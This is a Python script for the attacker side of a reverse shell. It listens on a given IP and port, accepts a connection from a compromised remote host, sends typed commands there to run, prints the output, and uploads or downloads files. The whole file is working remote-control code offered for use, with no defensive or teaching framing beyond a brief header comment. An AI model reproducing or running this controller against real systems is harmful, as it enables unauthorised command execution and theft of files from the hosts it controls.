#this script awaits for a single tcp connection
#from a remote host. Once the connection
#is established, it executes commands on the
#remote host and prints the output. It can
#download and upload files. 

import socket
import subprocess
import os 
import sys

def check_args():
	if len(sys.argv) == 3:
		global ip 
		global port 
		ip = str(sys.argv[1])
		port = int(sys.argv[2])

	else:
		print(f"Usage: python3 {sys.argv[0]} <IP> <port>")
		sys.exit(1)

def download(conn, exec_command):
	conn.send(exec_command.encode())
	print('[+]Downloading file...')
	_, path = exec_command.split(' ')
	f = open(os.path.join(os.getcwd(),os.path.basename(path)),'wb')
	while True:
		bits = conn.recv(4096)
		if bits.endswith('END'.encode()):
			f.write(bits[:-3])
			print('[+]Download complete')
			f.close()
			break
		if 'File not found'.encode() in bits:
			print('[-]File not found...')
			f.close()
			os.remove(os.path.join(os.getcwd(),os.path.basename(path)))
			break
		f.write(bits)

def upload(conn, exec_command):
	print('[+]Uploading file...')
	_, path = exec_command.split(' ')
	if not os.path.exists(path):
		print('[-]File not found...')
	else:
		conn.send(exec_command.encode())
		f = open(path,'rb')
		packet = f.read(4096)
		while len(packet) >0 :
			conn.send(packet)
			packet = f.read(4096)
		conn.send('END'.encode())
		f.close()
		print('[+]Upload complete')

def connect():
	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server.settimeout(20)
	try:
		server.bind((ip, port))
		server.listen(1)
		print(f'[+] Listening from incoming TCP connection on port {str(port)}...')
		conn, addr = server.accept()
		print(f"[+] Connected to {addr}")


	except Exception as e:
		print(f"[-]{e}")
		sys.exit(1)

	finally:
		while True:
			exec_command = input("Shell>")
			if exec_command == 'exit':
				conn.send('exit'.encode())
				print('[+]Exiting...')
				conn.close()
				break
			elif exec_command.startswith('download '):
				download(conn, exec_command)
			elif exec_command.startswith('upload '):
				upload(conn,exec_command)
			elif exec_command.startswith('cd '):
				conn.send(exec_command.encode())
				print(conn.recv(4096).decode())
			else:
				conn.send(exec_command.encode())
				full_msg = []
				while True:
					buff = conn.recv(4096).decode()
					full_msg += buff
					if len(buff) < 4096:
						break
				print(''.join(full_msg))
	
if __name__=='__main__':
	check_args()
	connect()
